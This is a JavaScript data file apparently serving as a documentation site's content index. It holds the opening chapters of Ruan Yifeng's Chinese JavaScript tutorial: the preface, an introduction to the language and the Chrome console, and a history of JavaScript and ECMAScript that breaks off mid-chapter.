(function(){var content=[{"context":[{"title":"关于","link":"/index.html"}],"content":"\n        <h1>\n            <a href='#关于此教程' class='header-anchor'>#</a>\n            <span>关于此教程</span>\n        </h1>\n    <p>你现在看到的是阮一峰老师的JavaScript教程。</p>\n<p>本教程的作者是阮一峰老师，采用<a href=\"https://creativecommons.org/licenses/by-sa/3.0/deed.zh\">知识共享 署名-相同方式共享 3.0协议</a>。</p>\n<p>本文档只是将其制作成了 <a href=\"https://github.com/teadocs/teadocs\">Teadocs</a> 的版本。</p>\n\n        <h1>\n            <a href='#本文档构建说明' class='header-anchor'>#</a>\n            <span>本文档构建说明</span>\n        </h1>\n    <p>请访问 <a href=\"https://github.com/teadocs/teadocs\">Teadocs</a> 的github地址以查找更多帮助。</p>\n"},{"context":[{"title":"阮一峰前言","link":"/preface.html"}],"content":"\n        <h1>\n            <a href='#前言' class='header-anchor'>#</a>\n            <span>前言</span>\n        </h1>\n    <p>我写这本教程，主要原因是自己需要。</p>\n<p>编程时，往往需要查阅资料，确定准确用法。理想的 JavaScript 参考书，应该简明易懂，一目了然，告诉我有哪些注意点，提供代码范例。如果涉及重要概念，还应该适当讲解。可是大多数时候，现实都不是如此。找到的资料冗长难懂，抓不住重点，有时还很陈旧，跟不上语言标准和浏览器的快速发展，且大多数是英文资料。</p>\n<p>学习过程中，我做了很多 JavaScript 笔记。多年累积，数量相当庞大。遇到问题，我首先查自己的笔记，如果笔记里没有，再到网上查，最后回过头把笔记补全。终于有一天，我意识到可以把笔记做成书，这就是这本书的由来。</p>\n<p>正因为脱胎于笔记，这本教程跟其他 JavaScript 书籍有所不同。作为教程，本书对所有重要概念都进行了讲解，努力把复杂的问题讲得简单，希望一两分钟内就能抓住重点。本书还可以作为参考手册，罗列了主要用法和各种 API 接口，并给出可以立即运行的代码。所有章节按照语言的 API 编排，方便以后的查阅。</p>\n<p>如果你发现某处出现陌生的新概念，请不要担心，可以继续阅读下去。以后查阅这些章节的时候，你会发现很方便找到某个知识点相关的所有内容。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"导论","link":"/basic/introduction.html"}],"content":"\n        <h1>\n            <a href='#导论' class='header-anchor'>#</a>\n            <span>导论</span>\n        </h1>\n    \n        <h2>\n            <a href='#什么是-JavaScript-语言？' class='header-anchor'>#</a>\n            <span>什么是 JavaScript 语言？</span>\n        </h2>\n    <p>JavaScript 是一种轻量级的脚本语言。所谓“脚本语言”（script language），指的是它不具备开发操作系统的能力，而是只用来编写控制其他大型应用程序（比如浏览器）的“脚本”。</p>\n<p>JavaScript 也是一种嵌入式（embedded）语言。它本身提供的核心语法不算很多，只能用来做一些数学和逻辑运算。JavaScript 本身不提供任何与 I/O（输入/输出）相关的 API，都要靠宿主环境（host）提供，所以 JavaScript 只合适嵌入更大型的应用程序环境，去调用宿主环境提供的底层 API。</p>\n<p>目前，已经嵌入 JavaScript 的宿主环境有多种，最常见的环境就是浏览器，另外还有服务器环境，也就是 Node 项目。</p>\n<p>从语法角度看，JavaScript 语言是一种“对象模型”语言。各种宿主环境通过这个模型，描述自己的功能和操作接口，从而通过 JavaScript 控制这些功能。但是，JavaScript 并不是纯粹的“面向对象语言”，还支持其他编程范式（比如函数式编程）。这导致几乎任何一个问题，JavaScript 都有多种解决方法。阅读本书的过程中，你会诧异于 JavaScript 语法的灵活性。</p>\n<p>JavaScript 的核心语法部分相当精简，只包括两个部分：基本的语法构造（比如操作符、控制结构、语句）和标准库（就是一系列具有各种功能的对象比如<code>Array</code>、<code>Date</code>、<code>Math</code>等）。除此之外，各种宿主环境提供额外的 API（即只能在该环境使用的接口），以便 JavaScript 调用。以浏览器为例，它提供的额外 API 可以分成三大类。</p>\n<ul>\n<li>浏览器控制类：操作浏览器</li>\n<li>DOM 类：操作网页的各种元素</li>\n<li>Web 类：实现互联网的各种功能</li>\n</ul>\n<p>如果宿主环境是服务器，则会提供各种操作系统的 API，比如文件操作 API、网络通信 API等等。这些你都可以在 Node 环境中找到。</p>\n<p>本书主要介绍 JavaScript 核心语法和浏览器网页开发的基本知识，不涉及 Node。全书可以分成以下四大部分。</p>\n<ul>\n<li>基本语法</li>\n<li>标准库</li>\n<li>浏览器 API</li>\n<li>DOM</li>\n</ul>\n<p>JavaScript 语言有多个版本。本书的内容主要基于 ECMAScript 5.1 版本，这是学习 JavaScript 语法的基础。ES6 和更新的语法请参考我写的<a href=\"http://es6.ruanyifeng.com/\">《ECMAScript 6入门》</a>。</p>\n\n        <h2>\n            <a href='#为什么学习-JavaScript？' class='header-anchor'>#</a>\n            <span>为什么学习 JavaScript？</span>\n        </h2>\n    <p>JavaScript 语言有一些显著特点，使得它非常值得学习。它既适合作为学习编程的入门语言，也适合当作日常开发的工作语言。它是目前最有希望、前途最光明的计算机语言之一。</p>\n\n        <h3>\n            <a href='#操控浏览器的能力' class='header-anchor'>#</a>\n            <span>操控浏览器的能力</span>\n        </h3>\n    <p>JavaScript 的发明目的，就是作为浏览器的内置脚本语言，为网页开发者提供操控浏览器的能力。它是目前唯一一种通用的浏览器脚本语言，所有浏览器都支持。它可以让网页呈现各种特殊效果，为用户提供良好的互动体验。</p>\n<p>目前，全世界几乎所有网页都使用 JavaScript。如果不用，网站的易用性和使用效率将大打折扣，无法成为操作便利、对用户友好的网站。</p>\n<p>对于一个互联网开发者来说，如果你想提供漂亮的网页、令用户满意的上网体验、各种基于浏览器的便捷功能、前后端之间紧密高效的联系，JavaScript 是必不可少的工具。</p>\n\n        <h3>\n            <a href='#广泛的使用领域' class='header-anchor'>#</a>\n            <span>广泛的使用领域</span>\n        </h3>\n    <p>近年来，JavaScript 的使用范围，慢慢超越了浏览器，正在向通用的系统语言发展。</p>\n<p><strong>（1）浏览器的平台化</strong></p>\n<p>随着 HTML5 的出现，浏览器本身的功能越来越强，不再仅仅能浏览网页，而是越来越像一个平台，JavaScript 因此得以调用许多系统功能，比如操作本地文件、操作图片、调用摄像头和麦克风等等。这使得 JavaScript 可以完成许多以前无法想象的事情。</p>\n<p><strong>（2）Node</strong></p>\n<p>Node 项目使得 JavaScript 可以用于开发服务器端的大型项目，网站的前后端都用 JavaScript 开发已经成为了现实。有些嵌入式平台（Raspberry Pi）能够安装 Node，于是 JavaScript 就能为这些平台开发应用程序。</p>\n<p><strong>（3）数据库操作</strong></p>\n<p>JavaScript 甚至也可以用来操作数据库。NoSQL 数据库这个概念，本身就是在 JSON（JavaScript Object Notation）格式的基础上诞生的，大部分 NoSQL 数据库允许 JavaScript 直接操作。基于 SQL 语言的开源数据库 PostgreSQL 支持 JavaScript 作为操作语言，可以部分取代 SQL 查询语言。</p>\n<p><strong>（4）移动平台开发</strong></p>\n<p>JavaScript 也正在成为手机应用的开发语言。一般来说，安卓平台使用 Java 语言开发，iOS 平台使用 Objective-C 或 Swift 语言开发。许多人正在努力，让 JavaScript 成为各个平台的通用开发语言。</p>\n<p>PhoneGap 项目就是将 JavaScript 和 HTML5 打包在一个容器之中，使得它能同时在 iOS 和安卓上运行。Facebook 公司的 React Native 项目则是将 JavaScript 写的组件，编译成原生组件，从而使它们具备优秀的性能。</p>\n<p>Mozilla 基金会的手机操作系统 Firefox OS，更是直接将 JavaScript 作为操作系统的平台语言，但是很可惜这个项目没有成功。</p>\n<p><strong>（5）内嵌脚本语言</strong></p>\n<p>越来越多的应用程序，将 JavaScript 作为内嵌的脚本语言，比如 Adobe 公司的著名 PDF 阅读器 Acrobat、Linux 桌面环境 GNOME 3。</p>\n<p><strong>（6）跨平台的桌面应用程序</strong></p>\n<p>Chromium OS、Windows 8 等操作系统直接支持 JavaScript 编写应用程序。Mozilla 的 Open Web Apps 项目、Google 的 <a href=\"http://developer.chrome.com/apps/about_apps\">Chrome App 项目</a>、Github 的 <a href=\"http://electron.atom.io/\">Electron 项目</a>、以及 <a href=\"http://tidesdk.multipart.net/docs/user-dev/generated/\">TideSDK 项目</a>，都可以用来编写运行于 Windows、Mac OS 和 Android 等多个桌面平台的程序，不依赖浏览器。</p>\n<p><strong>（7）小结</strong></p>\n<p>可以预期，JavaScript 最终将能让你只用一种语言，就开发出适应不同平台（包括桌面端、服务器端、手机端）的程序。早在2013年9月的<a href=\"http://adambard.com/blog/top-github-languages-for-2013-so-far/\">统计</a>之中，JavaScript 就是当年 Github 上使用量排名第一的语言。</p>\n<p>著名程序员 Jeff Atwood 甚至提出了一条 <a href=\"http://www.codinghorror.com/blog/2007/07/the-principle-of-least-power.html\">“Atwood 定律”</a>：</p>\n<blockquote>\n<p>“所有可以用 JavaScript 编写的程序，最终都会出现 JavaScript 的版本。”(Any application that can be written in JavaScript will eventually be written in JavaScript.)</p>\n</blockquote>\n\n        <h3>\n            <a href='#易学性' class='header-anchor'>#</a>\n            <span>易学性</span>\n        </h3>\n    <p>相比学习其他语言，学习 JavaScript 有一些有利条件。</p>\n<p><strong>（1）学习环境无处不在</strong></p>\n<p>只要有浏览器，就能运行 JavaScript 程序；只要有文本编辑器，就能编写 JavaScript 程序。这意味着，几乎所有电脑都原生提供 JavaScript 学习环境，不用另行安装复杂的 IDE（集成开发环境）和编译器。</p>\n<p><strong>（2）简单性</strong></p>\n<p>相比其他脚本语言（比如 Python 或 Ruby），JavaScript 的语法相对简单一些，本身的语法特性并不是特别多。而且，那些语法中的复杂部分，也不是必需要学会。你完全可以只用简单命令，完成大部分的操作。</p>\n<p><strong>（3）与主流语言的相似性</strong></p>\n<p>JavaScript 的语法很类似 C/C++ 和 Java，如果学过这些语言（事实上大多数学校都教），JavaScript 的入门会非常容易。</p>\n<p>必须说明的是，虽然核心语法不难，但是 JavaScript 的复杂性体现在另外两个方面。</p>\n<p>首先，它涉及大量的外部 API。JavaScript 要发挥作用，必须与其他组件配合，这些外部组件五花八门，数量极其庞大，几乎涉及网络应用的各个方面，掌握它们绝非易事。</p>\n<p>其次，JavaScript 语言有一些设计缺陷。某些地方相当不合理，另一些地方则会出现怪异的运行结果。学习 JavaScript，很大一部分时间是用来搞清楚哪些地方有陷阱。Douglas Crockford 写过一本有名的书，名字就叫<a href=\"http://javascript.crockford.com/\">《JavaScript: The Good Parts》</a>，言下之意就是这门语言不好的地方很多，必须写一本书才能讲清楚。另外一些程序员则感到，为了更合理地编写 JavaScript 程序，就不能用 JavaScript 来写，而必须发明新的语言，比如 CoffeeScript、TypeScript、Dart 这些新语言的发明目的，多多少少都有这个因素。</p>\n<p>尽管如此，目前看来，JavaScript 的地位还是无法动摇。加之，语言标准的快速进化，使得 JavaScript 功能日益增强，而语法缺陷和怪异之处得到了弥补。所以，JavaScript 还是值得学习，况且它的入门真的不难。</p>\n\n        <h3>\n            <a href='#强大的性能' class='header-anchor'>#</a>\n            <span>强大的性能</span>\n        </h3>\n    <p>JavaScript 的性能优势体现在以下方面。</p>\n<p><strong>（1）灵活的语法，表达力强。</strong></p>\n<p>JavaScript 既支持类似 C 语言清晰的过程式编程，也支持灵活的函数式编程，可以用来写并发处理（concurrent）。这些语法特性已经被证明非常强大，可以用于许多场合，尤其适用异步编程。</p>\n<p>JavaScript 的所有值都是对象，这为程序员提供了灵活性和便利性。因为你可以很方便地、按照需要随时创造数据结构，不用进行麻烦的预定义。</p>\n<p>JavaScript 的标准还在快速进化中，并不断合理化，添加更适用的语法特性。</p>\n<p><strong>（2）支持编译运行。</strong></p>\n<p>JavaScript 语言本身，虽然是一种解释型语言，但是在现代浏览器中，JavaScript 都是编译后运行。程序会被高度优化，运行效率接近二进制程序。而且，JavaScript 引擎正在快速发展，性能将越来越好。</p>\n<p>此外，还有一种 WebAssembly 格式，它是 JavaScript 引擎的中间码格式，全部都是二进制代码。由于跳过了编译步骤，可以达到接近原生二进制代码的运行速度。各种语言（主要是 C 和 C++）通过编译成 WebAssembly，就可以在浏览器里面运行。</p>\n<p><strong>（3）事件驱动和非阻塞式设计。</strong></p>\n<p>JavaScript 程序可以采用事件驱动（event-driven）和非阻塞式（non-blocking）设计，在服务器端适合高并发环境，普通的硬件就可以承受很大的访问量。</p>\n\n        <h3>\n            <a href='#开放性' class='header-anchor'>#</a>\n            <span>开放性</span>\n        </h3>\n    <p>JavaScript 是一种开放的语言。它的标准 ECMA-262 是 ISO 国际标准，写得非常详尽明确；该标准的主要实现（比如 V8 和 SpiderMonkey 引擎）都是开放的，而且质量很高。这保证了这门语言不属于任何公司或个人，不存在版权和专利的问题。</p>\n<p>语言标准由 TC39 委员会负责制定，该委员会的运作是透明的，所有讨论都是开放的，会议记录都会对外公布。</p>\n<p>不同公司的 JavaScript 运行环境，兼容性很好，程序不做调整或只做很小的调整，就能在所有浏览器上运行。</p>\n\n        <h3>\n            <a href='#社区支持和就业机会' class='header-anchor'>#</a>\n            <span>社区支持和就业机会</span>\n        </h3>\n    <p>全世界程序员都在使用 JavaScript，它有着极大的社区、广泛的文献和图书、丰富的代码资源。绝大部分你需要用到的功能，都有多个开源函数库可供选用。</p>\n<p>作为项目负责人，你不难招聘到数量众多的 JavaScript 程序员；作为开发者，你也不难找到一份 JavaScript 的工作。</p>\n\n        <h2>\n            <a href='#实验环境' class='header-anchor'>#</a>\n            <span>实验环境</span>\n        </h2>\n    <p>本教程包含大量的示例代码，只要电脑安装了浏览器，就可以用来实验了。读者可以一边读一边运行示例，加深理解。</p>\n<p>推荐安装 Chrome 浏览器，它的“开发者工具”（Developer Tools）里面的“控制台”（console），就是运行 JavaScript 代码的理想环境。</p>\n<p>进入 Chrome 浏览器的“控制台”，有两种方法。</p>\n<ul>\n<li>直接进入：按下<code>Option + Command + J</code>（Mac）或者<code>Ctrl + Shift + J</code>（Windows / Linux）</li>\n<li>开发者工具进入：开发者工具的快捷键是 F12，或者<code>Option + Command + I</code>（Mac）以及<code>Ctrl + Shift + I</code>（Windows / Linux），然后选择 Console 面板</li>\n</ul>\n<p>进入控制台以后，就可以在提示符后输入代码，然后按<code>Enter</code>键，代码就会执行。如果按<code>Shift + Enter</code>键，就是代码换行，不会触发执行。建议阅读本教程时，将代码复制到控制台进行实验。</p>\n<p>作为尝试，你可以将下面的程序复制到“控制台”，按下回车后，就可以看到运行结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greetMe(yourName) {\n  console.log(&#039;Hello &#039; + yourName);\n}\n\ngreetMe(&#039;World&#039;)\n// Hello World</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"历史","link":"/basic/history.html"}],"content":"\n        <h1>\n            <a href='#JavaScript-语言的历史' class='header-anchor'>#</a>\n            <span>JavaScript 语言的历史</span>\n        </h1>\n    \n        <h2>\n            <a href='#诞生' class='header-anchor'>#</a>\n            <span>诞生</span>\n        </h2>\n    <p>JavaScript 因为互联网而生，紧跟着浏览器的出现而问世。回顾它的历史，就要从浏览器的历史讲起。</p>\n<p>1990年底，欧洲核能研究组织（CERN）科学家 Tim Berners-Lee，在全世界最大的电脑网络——互联网的基础上，发明了万维网（World Wide Web），从此可以在网上浏览网页文件。最早的网页只能在操作系统的终端里浏览，也就是说只能使用命令行操作，网页都是在字符窗口中显示，这当然非常不方便。</p>\n<p>1992年底，美国国家超级电脑应用中心（NCSA）开始开发一个独立的浏览器，叫做 Mosaic。这是人类历史上第一个浏览器，从此网页可以在图形界面的窗口浏览。</p>\n<p>1994年10月，NCSA 的一个主要程序员 Marc Andreessen 联合风险投资家 Jim Clark，成立了 Mosaic 通信公司（Mosaic Communications），不久后改名为 Netscape。这家公司的方向，就是在 Mosaic 的基础上，开发面向普通用户的新一代的浏览器 Netscape Navigator。</p>\n<p>1994年12月，Navigator 发布了1.0版，市场份额一举超过90%。</p>\n<p>Netscape 公司很快发现，Navigator 浏览器需要一种可以嵌入网页的脚本语言，用来控制浏览器行为。当时，网速很慢而且上网费很贵，有些操作不宜在服务器端完成。比如，如果用户忘记填写“用户名”，就点了“发送”按钮，到服务器再发现这一点就有点太晚了，最好能在用户发出数据之前，就告诉用户“请填写用户名”。这就需要在网页中嵌入小程序，让浏览器检查每一栏是否都填写了。</p>\n<p>管理层对这种浏览器脚本语言的设想是：功能不需要太强，语法较为简单，容易学习和部署。那一年，正逢 Sun 公司的 Java 语言问世，市场推广活动非常成功。Netscape 公司决定与 Sun 公司合作，浏览器支持嵌入 Java 小程序（后来称为 Java applet）。但是，浏览器脚本语言是否就选用 Java，则存在争论。后来，还是决定不使用 Java，因为网页小程序不需要 Java 这么“重”的语法。但是，同时也决定脚本语言的语法要接近 Java，并且可以支持 Java 程序。这些设想直接排除了使用现存语言，比如 Perl、Python 和 TCL。</p>\n<p>1995年，Netscape 公司雇佣了程序员 Brendan Eich 开发这种网页脚本语言。Brendan Eich 有很强的函数式编程背景，希望以 Scheme 语言（函数式语言鼻祖 LISP 语言的一种方言）为蓝本，实现这种新语言。</p>\n<p>1995年5月，Brendan Eich 只用了10天，就设计完成了这种语言的第一版。它是一个大杂烩，语法有多个来源。</p>\n<ul>\n<li>基本语法：借鉴 C 语言和 Java 语言。</li>\n<li>数据结构：借鉴 Java 语言，包括将值分成原始值和对象两大类。</li>\n<li>函数的用法：借鉴 Scheme 语言和 Awk 语言，将函数当作第一等公民，并引入闭包。</li>\n<li>原型继承模型：借鉴 Self 语言（Smalltalk 的一种变种）。</li>\n<li>正则表达式：借鉴 Perl 语言。</li>\n<li>字符串和数组处理：借鉴 Python 语言。</li>\n</ul>\n<p>为了保持简单，这种脚本语言缺少一些关键的功能，比如块级作用域、模块、子类型（subtyping）等等，但是可以利用现有功能找出解决办法。这种功能的不足，直接导致了后来 JavaScript 的一个显著特点：对于其他语言，你需要学习语言的各种功能，而对于 JavaScript，你常常需要学习各种解决问题的模式。而且由于来源多样，从一开始就注定，JavaScript 的编程风格是函数式编程和面向对象编程的一种混合体。</p>\n<p>Netscape 公司的这种浏览器脚本语言，最初名字叫做 Mocha，1995年9月改为 LiveScript。12月，Netscape 公司与 Sun 公司（Java 语言的发明者和所有者）达成协议，后者允许将这种语言叫做 JavaScript。这样一来，Netscape 公司可以借助 Java 语言的声势，而 Sun 公司则将自己的影响力扩展到了浏览器。</p>\n<p>之所以起这个名字，并不是因为 JavaScript 本身与 Java 语言有多么深的关系（事实上，两者关系并不深，详见下节），而是因为 Netscape 公司已经决定，使用 Java 语言开发网络应用程序，JavaScript 可以像胶水一样，将各个部分连接起来。当然，后来的历史是 Java 语言的浏览器插件失败了，JavaScript 反而发扬光大。</p>\n<p>1995年12月4日，Netscape 公司与 Sun 公司联合发布了 JavaScript 语言，对外宣传 JavaScript 是 Java 的补充，属于轻量级的 Java，专门用来操作网页。</p>\n<p>1996年3月，Navigator 2.0 浏览器正式内置了 JavaScript 脚本语言。</p>\n\n        <h2>\n            <a href='#JavaScript-与-Java-的关系' class='header-anchor'>#</a>\n            <span>JavaScript 与 Java 的关系</span>\n        </h2>\n    <p>这里专门说一下 JavaScript 和 Java 的关系。它们是两种不一样的语言，但是彼此存在联系。</p>\n<p>JavaScript 的基本语法和对象体系，是模仿 Java 而设计的。但是，JavaScript 没有采用 Java 的静态类型。正是因为 JavaScript 与 Java 有很大的相似性，所以这门语言才从一开始的 LiveScript 改名为 JavaScript。基本上，JavaScript 这个名字的原意是“很像Java的脚本语言”。</p>\n<p>JavaScript 语言的函数是一种独立的数据类型，以及采用基于原型对象（prototype）的继承链。这是它与 Java 语法最大的两点区别。JavaScript 语法要比 Java 自由得多。</p>\n<p>另外，Java 语言需要编译，而 JavaScript 语言则是运行时由解释器直接执行。</p>\n<p>总之，JavaScript 的原始设计目标是一种小型的、简单的动态语言，与 Java 有足够的相似性，使得使用者（尤其是 Java 程序员）可以快速上手。</p>\n\n        <h2>\n            <a href='#JavaScript-与-ECMAScript-的关系' class='header-anchor'>#</a>\n            <span>JavaScript 与 ECMAScript 的关系</span>\n        </h2>\n    <p>1996年8月，微软模仿 JavaScript 开发了一种相近的语言，取名为JScript（JavaScript是Netscape的注册商标，微软不能用），首先内置于IE 3.0。Netscape 公司面临丧失浏览器脚本语言的主导权的局面。</p>\n<p>1996年11月，Netscape 公司决定将 JavaScript 提交给国际标准化组织 ECMA（European Computer Manufacturers Association），希望 JavaScript 能够成为国际标准，以此抵抗微软。ECMA 的39号技术委员会（Technical Committee 39）负责制定和审核这个标准，成员由业内的大公司派出的工程师组成，目前共25个人。该委员会定期开会，所有的邮件讨论和会议记录，都是公开的。</p>\n<p>1997年7月，ECMA 组织发布262号标准文件（ECMA-262）的第一版，规定了浏览器脚本语言的标准，并将这种语言称为 ECMAScript。这个版本就是 ECMAScript 1.0 版。之所以不叫 JavaScript，一方面是由于商标的关系，Java 是 Sun 公司的商标，根据一份授权协议，只有 Netscape 公司可以合法地使用 JavaScript 这个名字，且 JavaScript 已经被 Netscape 公司注册为商标，另一方面也是想体现这门语言的制定者是 ECMA，不是 Netscape，这样有利于保证这门语言的开放性和中立性。因此，ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现。在日常场合，这两个词是可以互换的。</p>\n<p>ECMAScript 只用来标准化 JavaScript 这种语言的基本语法结构，与部署环境相关的标准都由其他标准规定，比如 DOM 的标准就是由 W3C组织（World Wide Web Consortium）制定的。</p>\n<p>ECMA-262 标准后来也被另一个国际标准化组织 ISO（International Organization for Standardization）批准，标准号是 ISO-16262。</p>\n\n        <h2>\n            <a href='#JavaScript的版本' class='header-anchor'>#</a>\n            <span>JavaScript的版本</span>\n        </h2>\n    <p>1997年7月，ECMAScript 1.0发布。</p>\n<p>1998年6月，ECMAScript 2.0版发布。</p>\n<p>1999年12月，ECMAScript 3.0版发布，成为 JavaScript 的通行标准，得到了广泛支持。</p>\n<p>2007年10月，ECMAScript 4.0版草案发布，对3.0版做了大幅升级，预计次年8月发布正式版本。草案发布后，由于4.0版的目标过于激进，各方对于是否通过这个标准，发生了严重分歧。以 Yahoo、Microsoft、Google 为首的大公司，反对 JavaScript 的大幅升级，主张小幅改动；以 JavaScript 创造者 Brendan Eich 为首的 Mozilla 公司，则坚持当前的草案。</p>\n<p>2008年7月，由于对于下一个版本应该包括哪些功能，各方分歧太大，争论过于激进，ECMA 开会决定，中止 ECMAScript 4.0 的开发（即废除了这个版本），将其中涉及现有功能改善的一小部分，发布为 ECMAScript 3.1，而将其他激进的设想扩大范围，放入以后的版本，由于会议的气氛，该版本的项目代号起名为 Harmony（和谐）。会后不久，ECMAScript 3.1 就改名为 ECMAScript 5。</p>\n<p>2009年12月，ECMAScript 5.0版 正式发布。Harmony 项目则一分为二，一些较为可行的设想定名为 JavaScript.next 继续开发，后来演变成 ECMAScript 6；一些不是很成熟的设想，则被视为 JavaScript.next.next，在更远的将来再考虑推出。TC39 的总体考虑是，ECMAScript 5 与 ECMAScript 3 基本保持兼容，较大的语法修正和新功能加入，将由 JavaScript.next 完成。当时，JavaScript.next 指的是ECMAScript 6。第六版发布以后，将指 ECMAScript 7。TC39 预计，ECMAScript 5 会在2013年的年中成为 JavaScript 开发的主流标准，并在此后五年中一直保持这个位置。</p>\n<p>2011年6月，ECMAscript 5.1版发布，并且成为 ISO 国际标准（ISO/IEC 16262:2011）。到了2012年底，所有主要浏览器都支持 ECMAScript 5.1版的全部功能。</p>\n<p>2013年3月，ECMAScript 6 草案冻结，不再添加新功能。新的功能设想将被放到 ECMAScript 7。</p>\n<p>2013年12月，ECMAScript 6 草案发布。然后是12个月的讨论期，听取各方反馈。</p>\n<p>2015年6月，ECMAScript 6 正式发布，并且更名为“ECMAScript 2015”。这是因为 TC39 委员会计划，以后每年发布一个 ECMAScript 的版本，下一个版本在2016年发布，称为”ECMAScript 2016”，2017年发布“ECMAScript 2017”，以此类推。</p>\n\n        <h2>\n            <a href='#周边大事记' class='header-anchor'>#</a>\n            <span>周边大事记</span>\n        </h2>\n    <p>JavaScript 伴随着互联网的发展一起发展。互联网周边技术的快速发展，刺激和推动了 JavaScript 语言的发展。下面，回顾一下 JavaScript 的周边应用发展。</p>\n<p>1996年，样式表标准 CSS 第一版发布。</p>\n<p>1997年，DHTML（Dynamic HTML，动态 HTML）发布，允许动态改变网页内容。这标志着 DOM 模式（Document Object Model，文档对象模型）正式应用。</p>\n<p>1998年，Netscape 公司开源了浏览器，这导致了 Mozilla 项目的诞生。几个月后，美国在线（AOL）宣布并购 Netscape。</p>\n<p>1999年，IE 5部署了 XMLHttpRequest 接口，允许 JavaScript 发出 HTTP 请求，为后来大行其道的 Ajax 应用创造了条件。</p>\n<p>2000年，KDE 项目重写了浏览器引擎 KHTML，为后来的 WebKit 和 Blink 引擎打下基础。这一年的10月23日，KDE 2.0发布，第一次将 KHTML 浏览器包括其中。</p>\n<p>2001年，微软公司时隔5年之后，发布了 IE 浏览器的下一个版本 Internet Explorer 6。这是当时最先进的浏览器，它后来统治了浏览器市场多年。</p>\n<p>2001年，Douglas Crockford 提出了 JSON 格式，用于取代 XML 格式，进行服务器和网页之间的数据交换。JavaScript 可以原生支持这种格式，不需要额外部署代码。</p>\n<p>2002年，Mozilla 项目发布了它的浏览器的第一版，后来起名为 Firefox。</p>\n<p>2003年，苹果公司发布了 Safari 浏览器的第一版。</p>\n<p>2004年，Google 公司发布了 Gmail，促成了互联网应用程序（Web Application）这个概念的诞生。由于 Gmail 是在4月1日发布的，很多人起初以为这只是一个玩笑。</p>\n<p>2004年，Dojo 框架诞生，为不同浏览器提供了同一接口，并为主要功能提供了便利的调用方法。这标志着 JavaScript 编程框架的时代开始来临。</p>\n<p>2004年，WHATWG 组织成立，致力于加速 HTML 语言的标准化进程。</p>\n<p>2005年，苹果公司在 KHTML 引擎基础上，建立了 WebKit 引擎。</p>\n<p>2005年，Ajax 方法（Asynchronous JavaScript and XML）正式诞生，Jesse James Garrett 发明了这个词汇。它开始流行的标志是，2月份发布的 Google Maps 项目大量采用该方法。它几乎成了新一代网站的标准做法，促成了 Web 2.0时代的来临。</p>\n<p>2005年，Apache 基金会发布了 CouchDB 数据库。这是一个基于 JSON 格式的数据库，可以用 JavaScript 函数定义视图和索引。它在本质上有别于传统的关系型数据库，标识着 NoSQL 类型的数据库诞生。</p>\n<p>2006年，jQuery 函数库诞生，作者为John Resig。jQuery 为操作网页 DOM 结构提供了非常强大易用的接口，成为了使用最广泛的函数库，并且让 JavaScript 语言的应用难度大大降低，推动了这种语言的流行。</p>\n<p>2006年，微软公司发布 IE 7，标志重新开始启动浏览器的开发。</p>\n<p>2006年，Google推出 Google Web Toolkit 项目（缩写为 GWT），提供 Java 编译成 JavaScript 的功能，开创了将其他语言转为 JavaScript 的先河。</p>\n<p>2007年，Webkit 引擎在 iPhone 手机中得到部署。它最初基于 KDE 项目，2003年苹果公司首先采用，2005年开源。这标志着 JavaScript 语言开始能在手机中使用了，意味着有可能写出在桌面电脑和手机中都能使用的程序。</p>\n<p>2007年，Douglas Crockford 发表了名为《JavaScript: The good parts》的演讲，次年由 O&#39;Reilly 出版社出版。这标志着软件行业开始严肃对待 JavaScript 语言，对它的语法开始重新认识，</p>\n<p>2008年，V8 编译器诞生。这是 Google 公司为 Chrome 浏览器而开发的，它的特点是让 JavaScript 的运行变得非常快。它提高了 JavaScript 的性能，推动了语法的改进和标准化，改变外界对 JavaScript 的不佳印象。同时，V8 是开源的，任何人想要一种快速的嵌入式脚本语言，都可以采用 V8，这拓展了 JavaScript 的应用领域。</p>\n<p>2009年，Node.js 项目诞生，创始人为 Ryan Dahl，它标志着 JavaScript 可以用于服务器端编程，从此网站的前端和后端可以使用同一种语言开发。并且，Node.js 可以承受很大的并发流量，使得开发某些互联网大规模的实时应用变得容易。</p>\n<p>2009年，Jeremy Ashkenas 发布了 CoffeeScript 的最初版本。CoffeeScript 可以被转换为 JavaScript 运行，但是语法要比 JavaScript简洁。这开启了其他语言转为 JavaScript 的风潮。</p>\n<p>2009年，PhoneGap 项目诞生，它将 HTML5 和 JavaScript 引入移动设备的应用程序开发，主要针对 iOS 和 Android 平台，使得 JavaScript 可以用于跨平台的应用程序开发。</p>\n<p>2009，Google 发布 Chrome OS，号称是以浏览器为基础发展成的操作系统，允许直接使用 JavaScript 编写应用程序。类似的项目还有 Mozilla 的 Firefox OS。</p>\n<p>2010年，三个重要的项目诞生，分别是 NPM、BackboneJS 和 RequireJS，标志着 JavaScript 进入模块化开发的时代。</p>\n<p>2011年，微软公司发布 Windows 8操作系统，将 JavaScript 作为应用程序的开发语言之一，直接提供系统支持。</p>\n<p>2011年，Google 发布了 Dart 语言，目的是为了结束 JavaScript 语言在浏览器中的垄断，提供更合理、更强大的语法和功能。Chromium浏览器有内置的 Dart 虚拟机，可以运行 Dart 程序，但 Dart 程序也可以被编译成 JavaScript 程序运行。</p>\n<p>2011年，微软工程师<a href=\"http://www.hanselman.com/blog/JavaScriptIsAssemblyLanguageForTheWebSematicMarkupIsDeadCleanVsMachinecodedHTML.aspx\">Scott Hanselman</a>提出，JavaScript 将是互联网的汇编语言。因为它无所不在，而且正在变得越来越快。其他语言的程序可以被转成 JavaScript 语言，然后在浏览器中运行。</p>\n<p>2012年，单页面应用程序框架（single-page app framework）开始崛起，AngularJS 项目和 Ember 项目都发布了1.0版本。</p>\n<p>2012年，微软发布 TypeScript 语言。该语言被设计成 JavaScript 的超集，这意味着所有 JavaScript 程序，都可以不经修改地在 TypeScript 中运行。同时，TypeScript 添加了很多新的语法特性，主要目的是为了开发大型程序，然后还可以被编译成 JavaScript 运行。</p>\n<p>2012年，Mozilla 基金会提出 <a href=\"http://asmjs.org/\">asm.js</a> 规格。asm.js 是 JavaScript 的一个子集，所有符合 asm.js 的程序都可以在浏览器中运行，它的特殊之处在于语法有严格限定，可以被快速编译成性能良好的机器码。这样做的目的，是为了给其他语言提供一个编译规范，使其可以被编译成高效的 JavaScript 代码。同时，Mozilla 基金会还发起了 <a 